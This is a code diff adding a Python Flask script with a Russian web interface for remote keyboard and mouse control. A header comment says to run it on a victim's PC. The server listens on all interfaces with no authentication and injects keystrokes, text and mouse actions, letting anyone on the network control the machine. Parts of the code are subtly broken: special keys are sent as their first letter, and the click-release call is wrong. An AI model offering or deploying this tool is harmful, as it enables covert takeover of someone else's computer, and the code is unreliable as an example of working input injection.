@@ -1,0 +1,356 @@
+# remote_control.py
+# Запустить на ПК жертвы: python remote_control.py
+
+from flask import Flask, request, render_template_string
+import subprocess
+import platform
+
+app = Flask(__name__)
+
+# HTML + CSS + JavaScript
+HTML = """
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Удалённое управление</title>
+    <style>
+        body {
+            background: #1a1a1a;
+            color: #00ff00;
+            font-family: monospace;
+            padding: 20px;
+        }
+        .tab {
+            display: inline-block;
+            padding: 10px 20px;
+            background: #333;
+            cursor: pointer;
+            border-radius: 10px 10px 0 0;
+        }
+        .tab.active {
+            background: #00ff00;
+            color: black;
+        }
+        .content {
+            background: #222;
+            padding: 20px;
+            border-radius: 0 10px 10px 10px;
+            display: none;
+        }
+        .content.active {
+            display: block;
+        }
+        .keyboard {
+            display: grid;
+            grid-template-columns: repeat(10, 1fr);
+            gap: 5px;
+            max-width: 800px;
+            margin-top: 20px;
+        }
+        .key {
+            background: #333;
+            color: white;
+            text-align: center;
+            padding: 15px 5px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .key:hover {
+            background: #555;
+        }
+        .key.special {
+            background: #ff4444;
+        }
+        .touchpad {
+            width: 400px;
+            height: 300px;
+            background: #111;
+            border: 2px solid #00ff00;
+            border-radius: 10px;
+            margin: 20px 0;
+            position: relative;
+        }
+        .touchpad.active {
+            background: #003300;
+        }
+        button {
+            background: #00ff00;
+            color: black;
+            border: none;
+            padding: 8px 16px;
+            margin: 5px;
+            cursor: pointer;
+        }
+        input {
+            background: #333;
+            color: white;
+            border: 1px solid #00ff00;
+            padding: 8px;
+            width: 200px;
+        }
+        .log {
+            background: #000;
+            padding: 10px;
+            height: 150px;
+            overflow-y: auto;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+<h1>🎮 Удалённое управление</h1>
+
+<div>
+    <div class="tab active" onclick="showTab('keyboard')">⌨️ Клавиатура</div>
+    <div class="tab" onclick="showTab('mouse')">🖱️ Тачпад</div>
+</div>
+
+<div id="keyboard" class="content active">
+    <h3>Виртуальная клавиатура</h3>
+    <div class="keyboard">
+        <div class="key" onclick="sendKey('1')">1</div>
+        <div class="key" onclick="sendKey('2')">2</div>
+        <div class="key" onclick="sendKey('3')">3</div>
+        <div class="key" onclick="sendKey('4')">4</div>
+        <div class="key" onclick="sendKey('5')">5</div>
+        <div class="key" onclick="sendKey('6')">6</div>
+        <div class="key" onclick="sendKey('7')">7</div>
+        <div class="key" onclick="sendKey('8')">8</div>
+        <div class="key" onclick="sendKey('9')">9</div>
+        <div class="key" onclick="sendKey('0')">0</div>
+        
+        <div class="key" onclick="sendKey('q')">q</div>
+        <div class="key" onclick="sendKey('w')">w</div>
+        <div class="key" onclick="sendKey('e')">e</div>
+        <div class="key" onclick="sendKey('r')">r</div>
+        <div class="key" onclick="sendKey('t')">t</div>
+        <div class="key" onclick="sendKey('y')">y</div>
+        <div class="key" onclick="sendKey('u')">u</div>
+        <div class="key" onclick="sendKey('i')">i</div>
+        <div class="key" onclick="sendKey('o')">o</div>
+        <div class="key" onclick="sendKey('p')">p</div>
+        
+        <div class="key" onclick="sendKey('a')">a</div>
+        <div class="key" onclick="sendKey('s')">s</div>
+        <div class="key" onclick="sendKey('d')">d</div>
+        <div class="key" onclick="sendKey('f')">f</div>
+        <div class="key" onclick="sendKey('g')">g</div>
+        <div class="key" onclick="sendKey('h')">h</div>
+        <div class="key" onclick="sendKey('j')">j</div>
+        <div class="key" onclick="sendKey('k')">k</div>
+        <div class="key" onclick="sendKey('l')">l</div>
+        
+        <div class="key" onclick="sendKey('z')">z</div>
+        <div class="key" onclick="sendKey('x')">x</div>
+        <div class="key" onclick="sendKey('c')">c</div>
+        <div class="key" onclick="sendKey('v')">v</div>
+        <div class="key" onclick="sendKey('b')">b</div>
+        <div class="key" onclick="sendKey('n')">n</div>
+        <div class="key" onclick="sendKey('m')">m</div>
+        
+        <div class="key special" onclick="sendKey('space')">␣ Пробел</div>
+        <div class="key special" onclick="sendKey('enter')">↵ Enter</div>
+        <div class="key special" onclick="sendKey('backspace')">⌫ Backspace</div>
+        <div class="key special" onclick="sendKey('tab')">⇥ Tab</div>
+        <div class="key special" onclick="sendKey('escape')">Esc</div>
+        <div class="key special" onclick="sendKey('up')">↑</div>
+        <div class="key special" onclick="sendKey('down')">↓</div>
+        <div class="key special" onclick="sendKey('left')">←</div>
+        <div class="key special" onclick="sendKey('right')">→</div>
+    </div>
+    
+    <div style="margin-top: 20px;">
+        <input type="text" id="customText" placeholder="Любой текст...">
+        <button onclick="sendCustomText()">Отправить текст</button>
+    </div>
+</div>
+
+<div id="mouse" class="content">
+    <h3>🖱️ Тачпад</h3>
+    <div class="touchpad" id="touchpad"
+         ontouchmove="touchMove(event)"
+         ontouchstart="touchStart(event)"
+         ontouchend="touchEnd(event)"
+         onclick="clickSend('left')"
+         oncontextmenu="clickSend('right'); return false">
+    </div>
+    <div>
+        <button onclick="clickSend('left')">🖱️ Левый клик</button>
+        <button onclick="clickSend('right')">🖱️ Правый клик</button>
+        <button onclick="clickSend('middle')">🖱️ Средний клик</button>
+    </div>
+    <div>
+        <button onclick="sendScroll('up')">⬆️ Скролл вверх</button>
+        <button onclick="sendScroll('down')">⬇️ Скролл вниз</button>
+    </div>
+</div>
+
+<div class="log" id="log">
+    Готов к работе...
+</div>
+
+<script>
+function showTab(name) {
+    document.querySelectorAll('.content').forEach(c => c.classList.remove('active'));
+    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+    document.getElementById(name).classList.add('active');
+    event.target.classList.add('active');
+}
+
+async function sendKey(key) {
+    addLog('⌨️ ' + key);
+    await fetch('/key', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({key: key})});
+}
+
+async function sendCustomText() {
+    let text = document.getElementById('customText').value;
+    if (text) {
+        addLog('📝 Текст: ' + text);
+        await fetch('/text', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({text: text})});
+        document.getElementById('customText').value = '';
+    }
+}
+
+let lastX = 0, lastY = 0;
+function touchStart(e) {
+    let rect = document.getElementById('touchpad').getBoundingClientRect();
+    lastX = e.touches[0].clientX - rect.left;
+    lastY = e.touches[0].clientY - rect.top;
+}
+function touchMove(e) {
+    e.preventDefault();
+    let rect = document.getElementById('touchpad').getBoundingClientRect();
+    let x = e.touches[0].clientX - rect.left;
+    let y = e.touches[0].clientY - rect.top;
+    let dx = x - lastX;
+    let dy = y - lastY;
+    if (Math.abs(dx) > 2 || Math.abs(dy) > 2) {
+        fetch('/mouse', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({dx: dx, dy: dy})});
+        lastX = x;
+        lastY = y;
+    }
+}
+function touchEnd() {
+    addLog('🖱️ Коснулись тачпада');
+}
+
+async function clickSend(button) {
+    addLog('🖱️ ' + button + ' клик');
+    await fetch('/click', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({button: button})});
+}
+
+async function sendScroll(dir) {
+    addLog('📜 Скролл ' + dir);
+    await fetch('/scroll', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({dir: dir})});
+}
+
+function addLog(msg) {
+    let logDiv = document.getElementById('log');
+    logDiv.innerHTML += new Date().toLocaleTimeString() + ' - ' + msg + '<br>';
+    logDiv.scrollTop = logDiv.scrollHeight;
+}
+</script>
+</body>
+</html>
+"""
+
+@app.route('/')
+def index():
+    return render_template_string(HTML)
+
+@app.route('/key', methods=['POST'])
+def key_press():
+    key = request.json.get('key')
+    if key:
+        # Отправка клавиши на ПК
+        send_key_to_system(key)
+    return '', 204
+
+@app.route('/text', methods=['POST'])
+def type_text():
+    text = request.json.get('text', '')
+    if text:
+        for ch in text:
+            send_key_to_system(ch)
+    return '', 204
+
+@app.route('/mouse', methods=['POST'])
+def mouse_move():
+    dx = request.json.get('dx', 0)
+    dy = request.json.get('dy', 0)
+    move_mouse(dx, dy)
+    return '', 204
+
+@app.route('/click', methods=['POST'])
+def mouse_click():
+    button = request.json.get('button', 'left')
+    click_mouse(button)
+    return '', 204
+
+@app.route('/scroll', methods=['POST'])
+def mouse_scroll():
+    direction = request.json.get('dir', 'down')
+    scroll_mouse(direction)
+    return '', 204
+
+def send_key_to_system(key):
+    """Отправка клавиши в ОС"""
+    key_map = {
+        'space': 'space', 'enter': 'enter', 'backspace': 'backspace',
+        'tab': 'tab', 'escape': 'escape', 'up': 'up', 'down': 'down',
+        'left': 'left', 'right': 'right'
+    }
+    if key in key_map:
+        real_key = key_map[key]
+    else:
+        real_key = key
+    
+    system = platform.system()
+    if system == 'Windows':
+        # Через PowerShell
+        import ctypes
+        ctypes.windll.user32.keybd_event(ord(real_key[0]), 0, 0, 0)
+        ctypes.windll.user32.keybd_event(ord(real_key[0]), 0, 2, 0)
+    else:
+        # Linux/Mac через xdotool (требуется установка)
+        import subprocess
+        subprocess.run(['xdotool', 'type', real_key])
+
+def move_mouse(dx, dy):
+    system = platform.system()
+    if system == 'Windows':
+        import ctypes
+        ctypes.windll.user32.mouse_event(0x0001, int(dx), int(dy), 0, 0)
+    else:
+        import subprocess
+        subprocess.run(['xdotool', 'mousemove_relative', '--', str(int(dx)), str(int(dy))])
+
+def click_mouse(button):
+    btn_code = {'left': 0x0002, 'right': 0x0008, 'middle': 0x0020}
+    system = platform.system()
+    if system == 'Windows':
+        import ctypes
+        ctypes.windll.user32.mouse_event(btn_code.get(button, 0x0002), 0, 0, 0, 0)
+        ctypes.windll.user32.mouse_event(btn_code.get(button, 0x0002), 0, 0, 2, 0)
+    else:
+        import subprocess
+        subprocess.run(['xdotool', 'click', '1' if button == 'left' else '3' if button == 'right' else '2'])
+
+def scroll_mouse(direction):
+    system = platform.system()
+    if system == 'Windows':
+        import ctypes
+        ctypes.windll.user32.mouse_event(0x0800, 0, 0, 120 if direction == 'up' else -120, 0)
+    else:
+        import subprocess
+        subprocess.run(['xdotool', 'click', '4' if direction == 'up' else '5'])
+
+if __name__ == '__main__':
+    print("="*50)
+    print("УДАЛЁННОЕ УПРАВЛЕНИЕ ЗАПУЩЕНО")
+    print("Подключитесь с телефона по адресу: http://IP_ПК:5000")
+    print("="*50)
+    app.run(host='0.0.0.0', port=5000, debug=False)
